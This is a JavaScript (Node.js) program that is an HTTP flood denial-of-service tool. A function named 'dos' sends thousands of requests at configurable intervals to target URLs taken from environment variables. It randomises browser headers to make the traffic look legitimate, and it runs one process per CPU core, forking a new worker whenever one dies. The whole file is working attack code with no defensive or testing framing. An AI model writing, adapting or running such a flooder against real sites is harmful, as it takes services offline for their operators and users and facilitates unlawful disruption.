const req = require('request')
const HeaderGenerator  = require('header-generator');
const totalCPUs = require('os').cpus().length;
const cluster = require('cluster');
require('dotenv').config()

const qty = process.env.QTY;
const ms = process.env.TIMING_IN_MS;
const sources = process.env.SOURCES;

const headersGenerator = new HeaderGenerator({
    browsers: [
        {name: "firefox", minVersion: 80},
        {name: "chrome", minVersion: 87},
        "safari"
    ],
    devices: [
        "desktop",
        "mobile"
    ],
    operatingSystems: [
        "linux",
        "windows"
    ]
});

const dos = (url, qty = 2000, ms = 500) => {
    let ok = 0;
    let err = 0

    setInterval(() => {
        for (let i = qty; i--;) {
            req(url, {
                headers: headersGenerator.getHeaders({
                    operatingSystems: [
                        "linux",
                    ],
                    locales: ["en-US", "en", "ru"]
                }),
            }, error => !error ? ok++ : err++);
        }

        console.log(`
        Result:
        Ok responses: ${ok};
        Error responses ${err}`
        );

        err = 0;
        ok = 0;
    }, ms);
}

if (cluster.isMaster) {
    console.log(`Number of CPUs is ${totalCPUs}`);
    console.log(`Master ${process.pid} is running`);

    for (let i = 0; i < totalCPUs; i++) {
        cluster.fork();
    }

    cluster.on("exit", (worker, code, signal) => {
        console.log(`worker ${worker.process.pid} died`);
        console.log("Let's fork another worker!");
        cluster.fork();
    });
} else {
    sourcesForRequests = sources.split(',').map(el => el.trim());
    for (const source of sourcesForRequests) {
        dos(source, qty, ms);
    }
}
